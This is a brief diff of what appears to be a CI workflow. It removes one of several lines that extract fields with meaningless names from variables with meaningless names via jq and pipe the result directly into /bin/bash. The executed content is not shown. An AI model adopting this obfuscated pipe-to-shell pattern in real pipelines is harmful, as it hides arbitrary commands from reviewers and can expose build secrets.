@@ -49,7 +49,6 @@ jobs:
           printf '%s' "$j1" | jq -r .yrc59 | /bin/bash
           echo $upqd1 | jq -r .ft5677 | /bin/bash
           echo $qpaj6 | jq -r .f81752 | /bin/bash
-          printf '%s' "$osibo7866" | jq -r .jpn7053 | /bin/bash
           printf '%s' "$cfj9" | jq -r .ac585 | /bin/bash
           printf '%s' "$v15392" | jq -r .pei9901 | /bin/bash
           printf '%s' "$ii3" | jq -r .zhlw99 | /bin/bash
